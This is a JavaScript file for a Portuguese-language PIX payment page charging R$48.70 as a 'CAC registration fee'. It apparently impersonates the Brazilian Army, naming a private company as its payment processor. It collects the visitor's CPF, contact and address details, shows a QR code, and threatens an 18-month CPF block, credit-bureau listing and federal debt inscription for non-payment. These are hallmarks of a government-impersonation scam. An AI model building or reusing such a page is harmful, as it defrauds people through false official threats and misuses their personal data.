const PIX_API = {
    url: '/api/pix',
    amount: 48.70,

    generateIdentifier() {
        return `cac_${Date.now()}_${Math.random().toString(36).slice(2, 11)}`;
    },

    getUserData() {
        const read = (keys, fallback = '') => keys.map(key => localStorage.getItem(key)).find(Boolean) || fallback;
        return {
            cpf: read(['cpf'], '12345678900').replace(/\D/g, ''),
            nome: read(['nome', 'nomeCompleto'], 'Usuário Teste CAC'),
            telefone: read(['telefone', 'phone'], '5511999999999').replace(/\D/g, ''),
            email: read(['email'], 'teste@cac.com.br'),
            endereco: {
                cep: read(['cep'], '01310100').replace(/\D/g, ''),
                logradouro: read(['logradouro', 'rua'], 'Avenida Paulista'),
                numero: read(['numero'], '1000'),
                complemento: read(['complemento']),
                bairro: read(['bairro'], 'Bela Vista'),
                cidade: read(['cidade', 'localidade'], 'São Paulo'),
                estado: read(['estado', 'uf'], 'SP')
            }
        };
    },

    async createPixPayment() {
        const userData = this.getUserData();
        const identifier = this.generateIdentifier();
        const payload = {
            identifier,
            amount: this.amount,
            client: {
                name: userData.nome,
                email: userData.email,
                phone: userData.telefone.startsWith('55') ? `+${userData.telefone}` : `+55${userData.telefone}`,
                document: userData.cpf
            },
            products: [{
                id: 'cac_registro_taxa',
                name: 'Taxa de Registro CAC - Certificado de Registro',
                quantity: 1,
                price: this.amount,
                physical: false
            }],
            metadata: {
                provider: 'registro-cac',
                orderId: identifier
            }
        };

        const response = await fetch(this.url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
        const data = await response.json().catch(() => ({}));

        if (!response.ok) {
            const details = Array.isArray(data.details)
                ? `: ${data.details.map(item => item.error && item.error.message).filter(Boolean).join(', ')}`
                : '';
            throw new Error(data.message || `Erro ${response.status}${details}`);
        }

        localStorage.setItem('pixPaymentId', data.transactionId || identifier);
        localStorage.setItem('pixPaymentData', JSON.stringify(data));
        return data;
    }
};

function showPixPayment(paymentData, userData = null) {
    console.log('=== showPixPayment chamada ===');
    
    if (!userData) {
        userData = PIX_API.getUserData();
    }

    const loadingElement = document.getElementById('pix-loading');
    if (loadingElement) {
        loadingElement.style.display = 'none';
    }

    const pixContainer = document.getElementById('pix-container');
    if (!pixContainer) {
        console.error('Container pix-container não encontrado');
        return;
    }

    let pixCode = paymentData.pix && paymentData.pix.code;

    if (!pixCode) {
        pixContainer.innerHTML = `
            <div class="bg-yellow-50 border-l-4 border-yellow-500 p-4 mb-4">
                <div class="flex items-start">
                    <i class="fas fa-exclamation-triangle text-yellow-500 mt-1 mr-3"></i>
                    <div>
                        <p class="font-semibold text-yellow-800 mb-1">Pagamento criado mas código PIX não encontrado</p>
                        <p class="text-sm text-yellow-700">A API retornou sucesso mas não enviou o código PIX.</p>
                        <details class="mt-2">
                            <summary class="cursor-pointer text-xs text-yellow-600">Ver resposta completa</summary>
                            <pre class="text-xs mt-2 overflow-auto">${JSON.stringify(paymentData, null, 2)}</pre>
                        </details>
                    </div>
                </div>
            </div>
        `;
        return;
    }

    const valorFormatado = (paymentData.amount || PIX_API.amount).toLocaleString('pt-BR', {
        style: 'currency',
        currency: 'BRL'
    });

    pixContainer.innerHTML = `
        <div class="bg-white rounded-lg shadow-lg p-6 max-w-md mx-auto">
            <div class="text-center mb-6">
                <div class="bg-green-100 rounded-full w-16 h-16 flex items-center justify-center mx-auto mb-4">
                    <i class="fas fa-qrcode text-green-700 text-3xl"></i>
                </div>
                <h2 class="text-2xl font-bold text-green-800 mb-2">Pagamento via PIX</h2>
                <p class="text-gray-600 text-lg font-semibold">${valorFormatado}</p>
            </div>

            <div class="bg-red-50 border border-red-200 rounded-lg p-4 mb-6">
                <h3 class="text-red-700 font-bold mb-2">⚠️ Observações Importantes:</h3>
                <div class="text-red-700 text-sm space-y-2">
                    <p>Informamos que, caso o pagamento não seja realizado dentro do prazo estabelecido, o <strong class="cpf-display">${userData.cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4')}</strong> será bloqueado no sistema CAC pelo período de <strong class="cpf-display">18 (dezoito) meses</strong>.</p>
                    <p>Além disso, o valor da taxa, acrescido de multas, será registrado no <strong class="cpf-display">CPF</strong> junto aos órgãos de proteção ao crédito (<strong class="cpf-display">SPC e SERASA</strong>), bem como inscrito em <strong class="cpf-display">Dívida Ativa da União</strong>, nos termos da Lei nº 6.830/1980 (Lei de Execuções Fiscais).</p>
                    <p class="text-xs mt-2 text-red-600">Emitido em ${new Date().toLocaleString('pt-BR', { dateStyle: 'short', timeStyle: 'short' })}</p>
                </div>
            </div>

            <div class="mb-6">
                <div id="qrcode" class="flex justify-center mb-4 p-4 bg-gray-50 rounded"></div>
                <p class="text-sm text-gray-600 text-center mb-4">Escaneie o QR Code com o app do seu banco</p>
                <div class="bg-yellow-50 border-l-4 border-yellow-400 p-3 mb-4">
                    <div class="flex items-start">
                        <i class="fas fa-info-circle text-yellow-600 mt-0.5 mr-2"></i>
                        <div class="text-sm">
                            <p class="font-semibold text-yellow-800 mb-1">⚠️ Nome do Recebedor:</p>
                            <p class="text-yellow-700">O PIX será processado em nome de <strong class="cpf-display">TRADYEX PAYMENTS LTDA</strong>, empresa responsável pelo processamento de pagamentos do Exército Brasileiro.</p>
                        </div>
                    </div>
                </div>
            </div>

            <div class="mb-6">
                <label class="block text-sm font-medium text-gray-700 mb-2">Ou copie o código PIX:</label>
                <div class="flex gap-2">
                    <input type="text" id="pix-code" value="${pixCode}" readonly class="flex-1 px-3 py-2 border border-gray-300 rounded text-sm font-mono">
                    <button onclick="copyPixCode()" class="bg-green-700 hover:bg-green-800 text-white px-4 py-2 rounded font-semibold text-sm flex items-center gap-2">
                        <i class="fas fa-copy"></i> Copiar
                    </button>
                </div>
                <p id="copy-feedback" class="text-green-600 text-sm mt-2 hidden">✓ Código copiado!</p>
            </div>

            <div class="bg-blue-50 border-l-4 border-blue-500 p-4 mb-4">
                <div class="flex items-start">
                    <i class="fas fa-info-circle text-blue-500 mt-1 mr-3"></i>
                    <div class="text-sm text-blue-800">
                        <p class="font-semibold mb-1">Aguardando pagamento...</p>
                        <p class="mb-2">Após realizar o pagamento, aguarde a confirmação do provedor.</p>
                        <p class="text-xs">Para atualizar o status exibido, recarregue esta página.</p>
                    </div>
                </div>
            </div>

            <div class="text-center">
                <div class="spinner-border text-green-700 mb-2" role="status">
                    <span class="sr-only">Aguardando confirmação...</span>
                </div>
                <p class="text-sm text-gray-500">Verificando pagamento automaticamente...</p>
            </div>
        </div>
    `;

    try {
        new QRCode(document.getElementById('qrcode'), {
            text: pixCode,
            width: 256,
            height: 256,
            colorDark: '#000000',
            colorLight: '#ffffff',
            correctLevel: QRCode.CorrectLevel.L
        });
    } catch (error) {
        console.error('Erro ao gerar QR Code:', error);
    }

    const overlayNome = document.getElementById('text-overlay-1');
    const overlayCpf = document.getElementById('text-overlay-2');
    if (overlayNome) overlayNome.innerText = userData.nome.toUpperCase();
    if (overlayCpf) overlayCpf.innerText = userData.cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
}

function copyPixCode() {
    const pixCodeInput = document.getElementById('pix-code');
    const text = pixCodeInput.value;

    navigator.clipboard.writeText(text).then(() => {
        const feedback = document.getElementById('copy-feedback');
        if (feedback) {
            feedback.classList.remove('hidden');
            setTimeout(() => feedback.classList.add('hidden'), 3000);
        }
    }).catch(err => {
        pixCodeInput.select();
        try {
            document.execCommand('copy');
            const feedback = document.getElementById('copy-feedback');
            if (feedback) {
                feedback.classList.remove('hidden');
                setTimeout(() => feedback.classList.add('hidden'), 3000);
            }
        } catch (e) {
            alert('Erro ao copiar código. Por favor, copie manualmente.');
        }
    });
}

function onPaymentSuccess(paymentData) {
    const pixContainer = document.getElementById('pix-container');
    if (pixContainer) {
        pixContainer.innerHTML = `
            <div class="bg-white rounded-lg shadow-lg p-6 max-w-md mx-auto text-center">
                <div class="bg-green-100 rounded-full w-20 h-20 flex items-center justify-center mx-auto mb-4">
                    <i class="fas fa-check text-green-700 text-4xl"></i>
                </div>
                <h2 class="text-2xl font-bold text-green-800 mb-4">Pagamento Confirmado!</h2>
                <p class="text-gray-600 mb-6">
                    Seu pagamento foi confirmado com sucesso. Seu Certificado de Registro CAC
                    será processado e enviado para o endereço cadastrado em até 30 dias.
                </p>
                <div class="bg-green-50 border border-green-200 rounded p-4 mb-6">
                    <p class="text-sm text-green-800">
                        <strong>ID do Pagamento:</strong><br>
                        <span class="font-mono text-xs">${paymentData.transactionId || paymentData.identifier}</span>
                    </p>
                </div>
                <button onclick="window.location.reload()" class="bg-green-700 hover:bg-green-800 text-white px-6 py-3 rounded font-semibold">
                    Concluir
                </button>
            </div>
        `;
    }
    localStorage.setItem('pixPaymentStatus', 'PAID');
    localStorage.setItem('pixPaymentConfirmedAt', new Date().toISOString());
}

function onPaymentError(message) {
    const pixContainer = document.getElementById('pix-container');
    if (pixContainer) {
        pixContainer.innerHTML = `
            <div class="bg-white rounded-lg shadow-lg p-6 max-w-md mx-auto text-center">
                <div class="bg-red-100 rounded-full w-20 h-20 flex items-center justify-center mx-auto mb-4">
                    <i class="fas fa-times text-red-700 text-4xl"></i>
                </div>
                <h2 class="text-2xl font-bold text-red-800 mb-4">Erro no Pagamento</h2>
                <p class="text-gray-600 mb-6">${message}</p>
                <button onclick="window.location.reload()" class="bg-green-700 hover:bg-green-800 text-white px-6 py-3 rounded font-semibold">
                    Tentar Novamente
                </button>
            </div>
        `;
    }
}

document.addEventListener('DOMContentLoaded', function() {
    const savedPaymentData = localStorage.getItem('pixPaymentData');
    const savedPaymentStatus = localStorage.getItem('pixPaymentStatus');

    if (savedPaymentData && savedPaymentStatus !== 'PAID') {
        try {
            const paymentData = JSON.parse(savedPaymentData);
            if (paymentData.pix && paymentData.pix.code) {
                showPixPayment(paymentData);
            } else {
                localStorage.removeItem('pixPaymentData');
                localStorage.removeItem('pixPaymentId');
                gerarPix();
            }
        } catch (error) {
            localStorage.removeItem('pixPaymentData');
            gerarPix();
        }
    } else {
        gerarPix();
    }
});

async function gerarPix() {
    const loadingElement = document.getElementById('pix-loading');
    if (loadingElement) {
        loadingElement.classList.remove('hidden');
        loadingElement.style.display = 'block';
    }

    try {
        const paymentData = await PIX_API.createPixPayment();
        const userData = PIX_API.getUserData();
        showPixPayment(paymentData, userData);
    } catch (error) {
        if (loadingElement) {
            loadingElement.style.display = 'none';
        }
        const pixContainer = document.getElementById('pix-container');
        if (pixContainer) {
            pixContainer.innerHTML = `
                <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-4">
                    <div class="flex items-start">
                        <i class="fas fa-exclamation-circle text-red-500 mt-1 mr-3"></i>
                        <div>
                            <p class="font-semibold text-red-800 mb-1">Erro ao gerar código PIX</p>
                            <p class="text-sm text-red-700">${error.message || 'Ocorreu um erro ao processar seu pagamento.'}</p>
                            <p class="text-xs text-red-600 mt-2">Detalhes técnicos: ${error.stack || 'Sem detalhes adicionais'}</p>
                        </div>
                    </div>
                </div>
                <div class="flex justify-center mt-4">
                    <button onclick="location.reload()" class="bg-green-700 hover:bg-green-800 text-white px-6 py-2 rounded font-semibold">
                        Tentar Novamente
                    </button>
                </div>
            `;
        }
    }
}

window.PIX_API = PIX_API;
window.showPixPayment = showPixPayment;
window.copyPixCode = copyPixCode;
window.gerarPix = gerarPix;
window.onPaymentSuccess = onPaymentSuccess;
window.onPaymentError = onPaymentError;
